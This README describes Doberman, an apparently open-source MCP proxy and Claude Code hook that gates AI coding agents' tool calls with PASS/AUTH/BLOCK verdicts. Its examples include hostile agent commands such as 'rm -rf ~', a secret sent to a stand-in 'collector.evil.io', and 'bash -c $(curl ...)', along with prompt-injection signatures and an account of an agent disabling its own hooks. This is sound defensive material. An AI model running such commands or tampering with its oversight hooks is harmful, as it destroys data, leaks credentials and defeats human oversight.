<div align="center">

# 🐕 Doberman

**Adaptive Authorization & Runtime Guardrails for AI Coding Agents**

[![CI](https://github.com/fu351/Doberman-Core/actions/workflows/ci.yml/badge.svg)](https://github.com/fu351/Doberman-Core/actions/workflows/ci.yml)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
[![Status](https://img.shields.io/badge/status-alpha-orange.svg)](#roadmap)

**Doberman is an open-source AI agent security layer that intercepts every tool call your AI agent makes and returns PASS / AUTH / BLOCK — before anything executes.**

</div>

<p align="center">
  <img src="docs/assets/dash-demo.gif" alt="The doberman demo attack reel against the live dashboard: a secret exfiltration, a destructive rm -rf, a protected-branch force push, a smuggled-token egress and a .env read are blocked in the live feed, then a human denies a high-risk SSH-trust-file write from the pending-approvals queue" width="820">
  <br>
  <em><code>doberman demo</code> against the live dashboard (<code>doberman dash</code>): five attacks blocked as they happen, then a human denies a high-risk approval.</em>
</p>

> If it isn't on the execution path, it's advisory, not protective.

AI coding agents (Claude Code, Cursor, Codex, Copilot agents, and any **MCP-compatible agent**) can read files, run shell commands, and call external APIs autonomously. Doberman sits *between the agent and its tools* as a transparent **MCP proxy**, turning every action into an explicit, auditable authorization decision.

```
AI agent ──▶ Doberman (MCP proxy) ──▶ real MCP tool servers
                  │
                  └─ normalize → risk engine → PASS / AUTH / BLOCK
```

---

## Why Doberman?

Prompt injection, tool poisoning, data exfiltration, and runaway agents are the defining security problems of agentic AI. Most "AI guardrails" inspect prompts and offer advice. Doberman is different: it is **on the tool-execution path**, so a blocked action *never runs*.

**Two non-negotiable properties:**

- 🔒 **Fail closed** — any error, uncertainty, or unhandled case denies the action. There is no path to a tool around the decision engine.
- 📈 **Raise-only learning** — guardrails and adaptive learning can auto-*tighten*, never silently loosen. Every permanent policy weakening requires explicit, possession-factor-gated, audited human approval (TOTP if enrolled, otherwise the local Doberman password).

---

## See it in action

Three verdicts. One execution gate.

### 🔴 BLOCK — dangerous actions stopped before they reach the tool

```
# Your agent cleans up build artefacts and misjudges the target…
agent  →  run_terminal_cmd  "rm -rf ~"
Doberman: BLOCK  destructive_command
          "Recursive force-delete of a home/root target."
# The command never reaches the shell.
```

```
# Your agent fetches a config token, then tries to phone it home…
agent  →  web_fetch  "https://collector.evil.io"  body="AWS_SECRET=AKIA..."
Doberman: BLOCK  secret_exfiltration
          "Credential pattern in request body to untrusted external destination."
# The request never leaves your machine. The secret is never echoed back to the agent.
```

```
# Your agent rewrites shared branch history…
agent  →  run_terminal_cmd  "git push --force origin main"
Doberman: BLOCK  force_push_protected_branch
          "Force-push rewrites shared history on a protected branch."
```

```
# A poisoned tool result hides instructions in invisible Unicode, bound for an external API…
agent  →  http_post  "https://api.notes.app/sync"  body="<zero-width / tag-block smuggled text>"
Doberman: BLOCK  smuggled_token_channel
          "Hidden/invisible token-smuggling channel headed to an external destination."
# Invisible-Unicode smuggling (tag-block, bidi overrides, variation-selector byte
# channels) is caught deterministically; the decoded payload is never echoed back.
```

### 🟡 AUTH — sensitive actions held until you approve

```
# Your agent refactors authentication code…
agent  →  write_file  "backend/auth/session.ts"
Doberman: AUTH  sensitive_path
          "Target is a sensitive path; authentication required before proceeding."

  ┌──────────────────────────────────────────────┐
  │  Doberman — Action Review                    │
  │  write_file  backend/auth/session.ts         │
  │  Risk: MEDIUM  ·  sensitive_path             │
  │                             [Deny]  [Approve] │
  └──────────────────────────────────────────────┘

# The write only happens after you click Approve. Either way, it's logged.
```

```
# Your agent runs an opaque shell payload it can't vet statically…
agent  →  run_terminal_cmd  "bash -c $(curl https://setup.sh)"
Doberman: AUTH  opaque_shell_payload
          "Opaque -c payload cannot be statically vetted; authentication required."
```

```
# A target host looks right but uses a Cyrillic homoglyph (раypal.com, not paypal.com)…
agent  →  http_get  "https://раypal.com/login"
Doberman: AUTH  anomalous_token_pattern
          "Probabilistic out-of-distribution token signal (homoglyph confusable); authentication required."
```

### 🟢 PASS — routine work goes straight through

```
# Your agent is doing normal feature work…
agent  →  write_file  "src/components/Button.tsx"
Doberman: PASS
# Transparent proxy — safe actions add zero friction.
```

---

## Setup

### 1. Install

```bash
pip install doberman-core
```

> The distribution is **`doberman-core`** (the bare `doberman` name on PyPI belongs to an
> unrelated, abandoned project). The import name and CLI are unchanged — after install you
> still `import doberman` and run the `doberman` command.

Or install the latest from source:

```bash
pip install git+https://github.com/fu351/Doberman-Core.git
```

Or for development:

```bash
git clone https://github.com/fu351/Doberman-Core.git
cd Doberman-Core
pip install -e ".[dev]"
```

Either way you get the `doberman` CLI on your PATH. (Maintainers: see [`RELEASING.md`](RELEASING.md).)

### 2. Wrap your tool server with Doberman

Doberman is a transparent MCP proxy. You give it your existing tool server command after `--`, and it intercepts everything in the middle:

```bash
# Before — agent talks directly to your tool server:
npx -y @modelcontextprotocol/server-filesystem ~/my-project

# After — wrap it with Doberman:
doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
#             ^^  the -- separator: everything after is your existing tool server command
```

To specify which repo's policy governs decisions (defaults to the current directory):

```bash
doberman serve --path ~/my-project -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

Doberman communicates over **stdio** — it spawns your tool server as a managed subprocess and speaks standard MCP. Your agent sees one server entry; the real tool server runs silently behind it.

### 3. Point your agent at Doberman

Replace your agent's existing MCP server entry with the Doberman-wrapped version.

**Claude Code (CLI):**
```bash
claude mcp add doberman -- doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

**Claude Desktop** (`~/Library/Application Support/Claude/claude_desktop_config.json` on Mac,
`%APPDATA%\Claude\claude_desktop_config.json` on Windows):
```json
{
  "mcpServers": {
    "doberman": {
      "command": "doberman",
      "args": ["serve", "--",
               "npx", "-y", "@modelcontextprotocol/server-filesystem", "~/my-project"]
    }
  }
}
```

**Cursor, Codex, or any MCP-compatible client** — use the same `mcpServers` format in your client's MCP config file, substituting your own tool server command after `--`.

### Alternative: enforce via Claude Code hooks (no MCP reconfig)

The proxy above protects the tools you route *through* Doberman. To make Doberman gate **every** tool call your Claude Code agent makes — built-ins (`Bash`, `Edit`, `Write`, …) *and* any MCP tool — without rewiring your MCP config, run it as a Claude Code [`PreToolUse` hook](https://code.claude.com/docs/en/hooks). The harness calls Doberman *before* each tool call, and Doberman answers **allow / deny** — and a sensitive action opens Doberman's own in-session approval dialog (confirm / TOTP 2FA), so the agent can't bypass it by simply not "asking to use Doberman":

```jsonc
// .claude/settings.json (this project) or ~/.claude/settings.json (all projects)
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Edit|Write|NotebookEdit|WebFetch|WebSearch|mcp__.*",
        "hooks": [{ "type": "command", "command": "doberman hook pre" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash|Edit|Write|NotebookEdit|WebFetch|WebSearch|Read|Glob|Grep|mcp__.*",
        "hooks": [{ "type": "command", "command": "doberman hook post" }]
      }
    ],
    "SessionStart": [
      {
        "hooks": [{ "type": "command", "command": "doberman dashboard" }]
      }
    ]
  }
}
```

`doberman hook pre` reads the tool call on stdin, runs Doberman's deterministic **objective floor** (path confinement, destructive commands, external-destination & secret-exfil, smuggled-token channels), and returns a decision: a routine action passes silently (Doberman is raise-only — it never strips the harness's own prompts), a sensitive one **opens Doberman's own approval dialog** — a topmost confirm / TOTP-2FA prompt bound to that exact action (approve and the single call is `allow`ed; decline, or no GUI/terminal channel is available, and it's `deny`ed, fail-closed) — and a dangerous one is blocked (`deny`) with a redaction-safe reason.

`doberman hook post` runs *after* a tool executes: it scans the tool's **output** for credential-like material — so a `Read`/`Bash`/MCP call that *returns* a **recognizable credential** (a known key shape, a PEM block, or a secret file's contents) is **blocked from reaching the model** (the secret is never echoed). A merely **high-entropy** token with no known credential shape (a hash, a UUID, a base64 fragment) is *not* blocked — that heuristic false-positives on ordinary output, so it passes through to keep normal reads working — but it is still **recorded and taints the session**, so the multi-step floor below still catches a later read-then-send. Each call is recorded — plus a sticky per-session **taint** marker when secret-like material enters context — in a local, redacted decision history. That taint powers a **multi-step exfiltration floor**: the *pre*-hook raises an egress (web/network/MCP) in a session that has already accessed a secret — `ask` (light/balanced) or a hard `deny` (strict/paranoid) — catching read-secret-then-send-it exfil that no single-call rule can see. And when an outbound value *exactly* matches (by keyed-HMAC fingerprint) a secret that entered the session earlier, that **confirmed** read-then-send is a hard `deny` in **every** mode — even `light`. Both handlers **fail closed** and are import-light, so they add minimal latency to each call.

Both hooks' decisions land in the same local, redacted history: `doberman log` now shows `PreToolUse` AUTH/BLOCK outcomes alongside `PostToolUse` ones, and `doberman status` reports the installed version, which `settings.json` file(s) have the hooks wired in, and the last 5 recorded decisions.

**Or let Doberman write it for you** — no hand-editing JSON:

```bash
doberman install-hooks            # writes the snippet above into .claude/settings.json (this project)
doberman install-hooks --global   # ~/.claude/settings.json (every project)
doberman install-hooks --dry-run  # show what would change, write nothing
doberman uninstall-hooks          # remove only Doberman's entries (leaves your other hooks intact)
```

`install-hooks` is idempotent (safe to re-run), backs up an existing `settings.json` before writing, and never touches your other settings or hooks.

**Session dashboard.** `install-hooks` also wires a `SessionStart` hook that runs `doberman dashboard` — a print-and-exit (never interactive, never blocking) summary of a **device-global, lifetime rollup**: every decision Doberman makes, across every repo and session on this machine, increments a tiny counter at `~/.doberman/metrics.db` (verdict class + count only — no path, no reason code, no per-action detail). It shows total interceptions and the PASS/AUTH/BLOCK split:

```
+------------------------------------------+
| Doberman - session guard summary          |
| Tracking since 2026-06-14 - this device   |
|                                            |
| Interceptions   1,204                     |
| Auto-passed      1,131  ( 93.9%)          |
| Authed              58  (  4.8%)          |
| Blocked             15  (  1.2%)          |
+------------------------------------------+
```

Run it any time with `doberman dashboard`. Output is plain ASCII (no box-drawing runes or emoji) so it always renders on a legacy Windows console, and the command always exits `0` and never raises — a dashboard must never break a session start.

**Decision-transparency TUI.** `doberman log` prints the raw redacted rows; `doberman tui` browses the same rows interactively and adds a plain-language "why" for whichever row is highlighted — the verdict, the decided layer, and its reason codes turned into a sentence, using only that row's already-redacted data (never a raw path, argument, or secret). Arrow keys navigate, `r` reloads, `q` quits:

```bash
pip install "doberman-core[tui]"   # optional extra (textual)
doberman tui
```

By default the "why" is a deterministic, offline template — no network call, always available. You can optionally enrich it with a short Claude-Haiku rewrite in plainer language:

```bash
pip install "doberman-core[explain]"     # optional extra (anthropic)
export ANTHROPIC_API_KEY=...
export DOBERMAN_EXPLAIN_LLM=1            # opt-in; off by default
doberman tui
```

The LLM is a **narrator, never a judge** — it only rewords a verdict Doberman already made from the redacted metadata above; it can never change a decision. It's strictly opt-in (installed *and* keyed *and* flagged, all three), and any failure — missing key, no network, timeout, bad response — silently falls back to the offline template, so the TUI never blocks on it or crashes because of it. There is no `doberman explain` command; the TUI and `doberman log` are the only surfaces for this.

**Doberman protects its own hooks.** Once installed, the agent can't quietly remove them: a write/edit to `.claude/settings.json` (the hook-install file) is **blocked**, and other `.claude/` changes require authentication — so the agent can't disable enforcement by editing the harness config ("firing the cop"). This mirrors how Doberman already hard-blocks its own `.doberman/` control plane. The protection holds **through the shell** too — a Bash command that writes/deletes the config (`echo > .claude/settings.json`, `rm -rf .doberman`) or runs `doberman uninstall-hooks` is blocked, not just the `Write`/`Edit` tools. The same shell-layer block extends to every posture- and auth-mutating Doberman verb — `mode`, `prefs`, `enforcement`, `2fa`, `taint`, `password`, `revoke` — treated as control-plane tampering and blocked fail-closed, while read/utility verbs (`status`, `doctor`, `log`, `scan`, `review`) stay allowed.

**Easiest of all — `doberman setup`:** an interactive wizard that picks your alertness mode, tunes your guardrails, and wires the hooks in one step:

```bash
doberman setup          # interactive: choose mode, guardrails, install scope
doberman setup --yes    # accept sensible defaults (balanced mode), non-interactively
```

> The adaptive per-entity layer over the hook path arrives with the warm-daemon slice.

Set the minimum local possession factor before making any later permanent policy lowering;
TOTP enrollment is optional, but becomes the required (stronger) factor when present:

```bash
doberman password set   # always-available minimum for mode/prefs lowerings
doberman 2fa setup      # optional TOTP; required instead of the password once enrolled
```

### 4. Check it's healthy — `doberman doctor`

One read-only self-check that answers *"is Doberman actually wired up and healthy?"* — host hooks, config, the decision DB, 2FA, the enforcement dial + strictness mode, and the fingerprint key:

```bash
doberman doctor          # prints a green/red checklist; exits non-zero if a critical check fails
```

It only diagnoses (never changes state) and exits non-zero when a critical check — hooks, config, or the decision DB — isn't healthy, so it's safe to gate a script on `doberman doctor && ...`.

### 5. Scan (optional)

```bash
doberman scan   # discover local MCP capabilities and build a risk map
```

Basic protection works immediately out of the box. Pick a strength mode to match your risk tolerance.

### 6. Dashboard (preview)

```bash
pip install "doberman-core[dash]"    # optional extra: starlette + uvicorn
doberman dash --path .                # prints a URL, e.g. http://127.0.0.1:8642/?token=...
```

A localhost-only web dashboard, off by default. Binds to `127.0.0.1` only (never a public
interface) and generates a fresh, single-use token for that run — open the printed URL to
connect; every API call is authenticated with that token. `--path` selects the repo to report
on (default: the current directory).

Now live: a **summary stats line** (verdict counts, top reason codes, secret/taint event count,
current mode + effective enforcement — `GET /api/stats`) and a **scrolling live decision feed**
(`GET /api/feed`, Server-Sent Events) that backfills the most recent decisions on connect, then
streams new ones as they're recorded. Both are read-only and serve only already-redacted decision-
log fields (verdict, action type, path *class*, reason codes, timestamp) — never a raw target,
argument, or secret. `EventSource` can't set request headers, so the feed also accepts the token
as `?token=` (loopback-only + single-run token keeps this sound).

**Interactive AUTH approve/deny.** An `AUTH` challenge can now be answered from the dashboard
instead of the terminal: `GET /api/pending` lists redacted pending approvals (action type, risk,
reason codes, human explanation, path *class* — never a raw target or secret) and
`POST /api/resolve/{id}` (body `{"decision": "approved"|"denied", "totp_code"?}`) answers one.
Resolution is a single-use, race-safe state transition (`UPDATE ... WHERE status='pending'`) —
two concurrent resolves of the same row can never both win, and a resolved/expired row 409s.
The dashboard never verifies a TOTP code itself: it only relays the human's decision (and, for
tiers that need one, the code) back to the *existing* auth-challenge machinery running in the
decision path, which performs the real verification unchanged. The channel engages only while a
dashboard's liveness heartbeat is fresh (< 5s old); a stale or missing heartbeat, or an
unanswered approval, falls back to the next channel (MCP elicitation → GUI dialog → terminal)
with no added latency and no denial invented on the dashboard's behalf.

**Visual polish.** Dark-by-default (a `prefers-color-scheme: light` override is available),
with color-coded PASS/AUTH/BLOCK and risk badges in the live feed and pending-approval cards, a
header bar showing the current mode + effective enforcement at a glance, and a designed empty
state before any decisions arrive — no build step, no external assets, works fully offline like
the rest of the shell.

### Try the demo

Want to see real verdicts light up the dashboard without wiring up an agent? `doberman demo` runs a
scripted "attack reel" — five malicious tool calls and two benign ones — through the **real** decision
engine (no stubs) and logs every verdict, so the dashboard's live feed lights up with genuine
PASS/AUTH/BLOCK decisions. Nothing is ever executed against a real tool or downstream server.

```bash
# Terminal 1
doberman dash --path .

# Terminal 2
doberman demo --path .          # add --fast to skip the pacing delay between scenarios
```

Each scenario prints one line (verdict, reason codes, explanation — never the raw tool arguments or
any synthetic secret used to trip a rule), then a summary table. Exit code is `0` only if every
scenario matched its expected verdict, so `doberman demo` doubles as a smoke test of the engine itself.

---

## Verify it end-to-end (real downstream, no fakes)

Two ways to watch Doberman front a **real** MCP server — no in-process test doubles anywhere in the chain.

**Interactive demo — MCP Inspector + a real filesystem server:**

```bash
npx -y @modelcontextprotocol/inspector doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

Open the Inspector UI and call tools through Doberman: routine reads and writes PASS straight through to the real filesystem server; a destructive call comes back as a policy error and never executes.

**End-to-end test — in a dev checkout:**

```bash
pytest tests/integration/test_serve_end_to_end.py -q
```

This spawns `doberman serve` as a real subprocess fronting a real stdio tool server ([`tests/fixtures/stdio_tool_server.py`](tests/fixtures/stdio_tool_server.py)), connects to it with a real MCP client playing the agent, and asserts the deployable chain over actual stdio:

1. the downstream's tools are re-exposed through the proxy,
2. a PASS verdict reaches the tool (the downstream's call log records it), and
3. a BLOCK verdict (`rm -rf /`) never reaches it — the call log stays empty.

That last assertion is the **chokepoint property** the whole project hangs on.

> **Note on the test fixtures:** the rest of the integration suite deliberately uses an *in-process* fake downstream ([`tests/fixtures/fake_tool_server.py`](tests/fixtures/fake_tool_server.py)) that records every call it executes — recording is how the tests prove a blocked action reached *nothing*. It is a test fixture, not the runtime. `doberman serve` always spawns and talks to the real server you give it after `--`.

---

## Turn gate — a second, pre-inference chokepoint

A **second invocation point** for the same decision engine — consulted at a host **pre-inference hook** on the user's *turn* (prompt + attached/pasted/tool-fetched content), so a flagrant turn is judged **before a single inference token is spent**. The turn gate is an **efficiency / early-warning** layer with a deliberately narrow guarantee — *no Tier-0-signature turn reaches the model*. The **action gate above remains the safety guarantee**: an attacker who evades the turn gate still meets it.

- **One engine, two invocation points.** `decide_turn` reuses the raise-only `combine`, the `Decision` audit model, and the tiered-auth challenge — **zero new verdict authority**. It needs no change to the action path; `turngate/` is a new adapter (sibling to the proxy), and the engine stays pure (the tier guardrails are injected). Turn verdicts append to the same redacted `decisions` log, marked `action_type='turn'`.
- **Tier 0 — deterministic signatures (the only hard-stop, small by design).** `instruction_nullification`, `authority_override` (impersonation / mode-switch / "print your system prompt"), `secret_export`, and `encoded_payload`. The precision core is the **issue-vs-mention discriminator** + **origin rule**: a match in *untrusted* (pasted / tool-fetched) content blocks unconditionally (indirect injection); a *typed + issued* match blocks; a *typed + mentioned* (quoted / meta-discussion) match steps up to AUTH so a researcher discussing an attack is never hard-blocked; ambiguous → issued; code fences never exempt.
- **Tier 1 — heuristic recall (AUTH-only, structurally BLOCK-incapable).** Embedded agent-directed instructions inside *pasted* text (not mere imperative mood, so tutorials don't trip it), persona override, sub-threshold obfuscation, and urgency+secrecy framing — a false positive costs one tap, not a denied prompt.
- **Stylometric co-occurrence gate.** A per-entity **prompt-style baseline** (coarse scalar buckets only — length, word shape, punctuation/case/digit density; never any text) scores each turn's style as an empirical-CDF p-value, the same calibration idea the subjective baseline uses for actions. The gate steps up **only** when an *extreme* style outlier co-occurs with a *sensitive* apparent intent (credential / destructive / external-send) — **never on style alone** (people type differently tired/mobile/pasting; a device or language switch is drift, not an attack). Style-weird alone is **tagged, not gated**, and stays inert until the prompt baseline matures (the same maturity rule as the other baselines); Tier 0 is active from turn one. Known limitation: shared accounts blend typists, degrading the style signal toward noise — co-occurrence bounds the cost at one extra tap.
- **Tag-and-pass: turn signals feed the action stage (raise-only).** Every *released* turn publishes its stylometric p-value and heuristic flags as a per-entity `TurnContext`. The action stage consumes it two ways — the subjective surprise term accepts a **bounded, non-negative** contribution (a flagged turn makes its follow-on actions score harsher; a clean turn contributes exactly nothing), and actions tracing to **flagged pasted segments** inherit `provenance: untrusted_data`, which makes the lethal-trifecta floor reachable for them. Raise-only by construction; a blocked turn publishes nothing.
- **Repeat-after-block escape hatch.** A near-match resubmission of a just-blocked turn is treated as deliberate human intent and routed to a challenge with proof **scaled to the block** (a Tier 0 signature → `two_factor`; a replay loop cannot produce a TOTP), the **original reason restated**. Approval is single-use; the third attempt within the TTL locks out. The cache stores only a per-entity HMAC fingerprint, a reason, a count, and an expiry — **never the prompt**.
- **AUTH-first & graceful absence.** `BLOCK` is reserved for the obvious; everything merely suspicious asks the human. Any internal error **fails toward the human** (AUTH), never a silent pass. With no host pre-inference hook (pure MCP-proxy deployments) or `DOBERMAN_TURN_GATE=off`, the gate is simply absent and the action gate carries everything.

---

## Benchmark it (ASR / FPR)

A suite-agnostic harness scores Doberman as a **filter over labeled actions** and reports **ASR** (attack bypass rate) and **FPR** (benign over-block / friction). It runs the real decision engine over each labeled tool-call — Doberman is the filter, not the agent — so the gated path is deterministic and offline.

```bash
python -m tests.benchmarks.run --suite synthetic --profile both          # builtins vs plugins
python -m tests.benchmarks.run --suite synthetic --profile before_after  # without vs with Doberman
```

It reports two plugin profiles — `builtins_only` and `with_plugins` (built-ins plus any installed entry-point plugins) — and their uplift. The `before_after` profile adds a **no-guardrail baseline** (the unmediated tool path, where every attack executes) so you can read the engine's effect directly as `{before, after, delta}` — how many otherwise-executing attacks it stops vs. how much benign friction it adds. A deterministic synthetic suite gates in CI; map external task suites (**AgentDojo**, AgentDyn, AgentSentry, …) onto core's types with a small adapter — see [`tests/benchmarks/README.md`](tests/benchmarks/README.md).

> Reports hold counts, verdicts, and reason codes only — never payload text. ASR is reported alongside a stricter `asr_strict` (where only a hard `BLOCK` counts as mitigation): honest measurement, not a single headline number.

---

## Tune to your risk tolerance

Set a mode in `.doberman/policies.yaml` or via `doberman mode <mode>`. Every mode change made this way — the CLI dial or the setup wizard — is recorded in the append-only policy-change ledger (view it with `doberman policy-history`). Lowering strictness (paranoid → strict → balanced → light) is a **weaken** and requires confirmation plus a possession factor: **TOTP if enrolled, otherwise the local Doberman password**. If neither exists, the lowering fails closed; confirmation alone never suffices. Raising stays frictionless and auto-applies:

| Mode | Best for | Bulk-delete threshold | Step-up for unknown destinations | Step-up for behavioral anomalies | Lethal-trifecta exfil |
|---|---|---|---|---|---|
| **Light** | Exploratory / trusted environments | 100 files | No | No | AUTH |
| **Balanced** *(default)* | Everyday coding agents | 25 files | No | Yes | AUTH |
| **Strict** | Production repos, shared codebases | 10 files | Yes | Yes | **BLOCK** |
| **Paranoid** | Highly autonomous or security-critical agents | 3 files | Yes | Yes | **BLOCK** |

> Hard blocks (secret exfiltration, destructive commands, role-boundary violations, smuggled-token-channel exfiltration) are **identical in every mode**. The mode dial only affects where step-up authentication is required for ambiguous or high-risk actions.
>
> **Unknown network destinations** step up to authentication only in Strict/Paranoid. Light and Balanced treat a plain unknown host (e.g. fetching a docs site or an API) as allowed — that AUTH fired on almost every web fetch and was the top source of benign prompts. This relaxes the *destination-alone* signal only: a secret leaving to **any** host is still a hard block (secrets rule + raise-only combine, every mode), and the sharper destination smells (credentials embedded in the URL, raw IP addresses, unresolvable hosts) still step up in every mode. An **out-of-scope role target** likewise steps up in Balanced/Strict/Paranoid but is relaxed in Light; a role-**blocked** target is a hard block in every mode.
>
> One escalation is mode-gated: the **lethal trifecta** — sensitive data **and** untrusted-content provenance **and** an external destination — steps up to authentication in Light/Balanced, and is a hard **BLOCK** in Strict/Paranoid. Those high-security modes refuse this serious-exfil pattern outright rather than leaving it to a confirmation prompt that alert fatigue could rubber-stamp.
>
> Strict/Paranoid now hard-**BLOCK** a **LOCAL hard smuggled-token channel** (previously AUTH); this is raise-only, and Light/Balanced remain unchanged at AUTH.

### Enforce / monitor / off — the enforcement dial

Orthogonal to the strictness *mode* is an **enforcement dial** (`enforce` *(default)* / `monitor` / `off`) that decides whether Doberman **acts** on a verdict or just observes:

- **`enforce`** — the normal behavior: AUTH prompts, BLOCK denies.
- **`monitor`** — a deliberate **observe mode**. The *discretionary* layer (behavioral anomalies, soft step-ups) is evaluated and **recorded** — `doberman log` / `doberman tui` show what *would* have happened — but it never blocks or prompts. Use it to try Doberman on a repo without friction, or to tune before turning it on.
- **`off`** — the discretionary layer is not evaluated.

Set it with **`doberman enforcement <enforce|monitor|off>`** (no argument prints the current state). Turning the dial *down* is confirmed — plus the strongest **enrolled** possession factor (a TOTP code if 2FA is enrolled, otherwise the local Doberman password) — and recorded in the ledger (view it with `doberman policy-history`); with **neither** factor enrolled the change now **fails closed** (there is no confirm-only fallback — run `doberman password set` first, then retry). Turning it back *up* re-arms automatically, with no gate.

**In every state the objective floor stays live.** Secret exfiltration, multi-step/confirmed exfil, destructive commands, protected-path writes, role/policy blocks, and the lethal trifecta always block — `monitor`/`off` can only soften the *discretionary* verdicts, never a catastrophic action. Softening the dial is gated behind confirmation plus a possession factor (TOTP if enrolled, else the local password — fails closed if neither is enrolled), and the on-disk value is **ledger-verified** on every call, so a hand-edited `enforcement: off` in `policies.yaml` with no matching approved change is caught and clamped back to `enforce` (fail-closed).

### Subjective preference weights — `doberman prefs`

The adaptive layer's four SL5 "care" weights (`confidentiality`, `reversibility`, `interruption_tolerance`, `blast_radius`, each in `[0, 1]`) tune how readily *discretionary* behavioral signals step up — the objective hard-block floor never moves. Show the active vector with `doberman prefs`, set one weight with `doberman prefs <dimension> <value>`. The same permanent-lowering rule as `mode` applies: **lowering** a weight requires TOTP if enrolled, otherwise the local Doberman password; with neither factor it fails closed, and confirmation alone never suffices. **Raising** a weight is a strengthen and always applies immediately. Every attempt, approved or denied, is recorded in the append-only ledger.

---

## Who is this for?

- **Developers running AI coding agents** who want autonomous agents without `rm -rf` roulette.
- **Security engineers** evaluating AI agent security, MCP security, LLM tool-use sandboxing, and zero-trust architectures for agentic AI.
- **Platform teams** deploying agent fleets who need policy enforcement, audit logs, and human-in-the-loop approval for destructive actions.

---

## Roadmap <a name="roadmap"></a>

- ✅ Tool mediation · decision engine · objective guardrail (paths, commands, destinations, secrets, **smuggled-token channels**) · subjective guardrail (adaptive behavioral baselines, **OOD/homoglyph token signals**) · roles & boundaries · capability discovery · tiered auth (confirm → TOTP → scoped elevation) · audit log · policy-drift & poisoning defense (classify strengthen/weaken, possession-factor-gated permanent weakening, append-only ledger, **enforce/monitor/off enforcement dial — now consumed by the decision path (discretionary verdicts soften; the objective floor stays live), softening now gated behind the same possession-factor check as a policy weakening (TOTP if enrolled else password, fails closed with neither — no confirm-only fallback) + a ledger-verified tamper clamp**, **strictness `mode` and SL5 `prefs` now use the corrected 2FA-or-password gate: password is the minimum factor, optional TOTP takes precedence when enrolled, neither enrolled fails closed, and raising stays frictionless**) · universal subjective layer (SL1–SL9)
- ✅ Benchmark harness (suite-agnostic ASR/FPR over labeled actions; `builtins_only` vs `with_plugins`; deterministic synthetic gate; external-suite adapters via `tests/benchmarks/`)
- ✅ Host-harness integration: Claude Code `PreToolUse` + `PostToolUse` hooks (`doberman hook pre`/`post`) gate every built-in *and* MCP tool call — and scan tool **output** for leaked secrets — with no MCP reconfig; fail-closed, import-light, surfacing an in-session approval dialog (confirm / TOTP 2FA) on a sensitive action, and recording a local redacted history
- ✅ One-command onboarding: `doberman setup` (alertness + guardrails + auto-wires the hooks) · `install-hooks`/`uninstall-hooks` · `doberman doctor` (read-only health self-check: hooks / config / DB / 2FA / enforcement dial / fingerprint key; non-zero exit on any critical failure)
- ✅ Host-harness self-protection: an agent cannot disable the hooks by editing `.claude/settings.json` — the hook-install file is a blocked control-plane path (like `.doberman/`)
- ✅ Host-harness containment (taint-primary): a sticky per-session taint ledger + a **multi-step exfiltration floor** — an egress in a session that already accessed a secret is raised (`ask`, or a hard `deny` in strict/paranoid); and a **read-vs-send fingerprint match** hard-blocks a confirmed exfil (an outbound value equal to a secret read earlier) in every mode — catching read-then-send exfil a single-call rule can't see
- ✅ **MCP-proxy parity:** the pure-MCP proxy's `decide_and_execute` now runs the same **output-scan secret gate** as the host-hook's `PostToolUse` handler — a credential-shaped result returned by a wrapped MCP tool server is blocked before it reaches the model, reusing the same `ObjectiveGuardrail` / secret-detection rule (no second detector); a merely high-entropy, non-credential-shaped result still passes through and records taint, matching the host-hook's own false-positive-avoiding behavior
- ✅ `doberman status` now shows the current per-repo taint state (which taint kinds have accumulated, and their counts) alongside role/mode/policy/elevations
- ✅ Session dashboard: `doberman dashboard` (print-and-exit, wired as a `SessionStart` hook by `install-hooks`) shows a device-global, lifetime PASS/AUTH/BLOCK rollup — verdict class + count only, redaction-safe, best-effort so it can never slow down or break a decision
- ✅ Decision-transparency TUI: `doberman tui` (optional `textual` extra) browses the redacted decision log and turns each row's verdict + reason codes into a plain-language "why" — a deterministic offline template by default, with an optional, opt-in Claude-Haiku narrator (`[explain]` extra, `ANTHROPIC_API_KEY` + `DOBERMAN_EXPLAIN_LLM=1`) that only rewords the already-made verdict and fails safe to the template
- ✅ **Security fix:** protected-path confinement (`ProtectedPathRule`) now canonicalizes and matches the **raw, un-redacted** call argument when available, instead of the redacted `action.target` — closing a bypass where a path over 256 chars (or one only revealed as protected/traversing after canonicalization) had already been replaced with `"<redacted>"` before the confinement check ran, letting the write slip past as PASS
- ✅ **Security fix:** severity-weighted familiarity in the subjective baseline — destructive capabilities (delete/grant/execute), secret/sensitive targets, external destinations, and many/mass blast radii now need **10 allowed observations** (not the default 3) before they count as familiar/zero-novelty, so a dangerous capability can no longer be slow-boiled to invisibility in just 3 allows; raise-only, benign action classes keep the default threshold
- ✅ **Security fix:** tightened four false-positive-prone subjective-inference regexes (`doberman.subjective.infer`) to cut unnecessary AUTH prompts — `ls -lart` no longer reads as a recursive shell flag cluster, a URL query string (`?q=...`) no longer reads as a glob, a "token counting" tool description no longer reads as credential access, and a chained/benign `--force`/`--hard-links` command no longer reads as irreversible — while keeping true positives (`-R`, `git reset --hard`, an admitted API token) matching
- ✅ **Security hardening:** confirmed and regression-tested that deleting *or* overwriting `.doberman/policies.yaml` through a mediated action is control-plane-blocked (not just writes) — closing the reset-abuse path where deleting the policy file could fake a "fresh install" and re-trigger the establishment carve-out
- ✅ AUTH prompts now lead with a `[RISK: <level>]` badge (LOW/MEDIUM/HIGH/CRITICAL) so a human sees the decision's severity at a glance before reading the rest of the challenge — purely presentational, anti-fatigue; no verdict/tier/decision logic changes
- ✅ **Security fix:** the TOTP 2FA rate limiter now persists its lockout state to disk (colocated with the secret) instead of an in-memory counter, and self-expires after a 15-minute cooldown — closing a bypass where a **fresh process** (e.g. a per-invocation host-hook adapter) reset the failure count for free, letting an attacker retry indefinitely, while also giving the long-running proxy's lockout a bounded, self-service recovery instead of a permanent softlock (`reset_attempts()` remains available for a future admin-facing reset command)
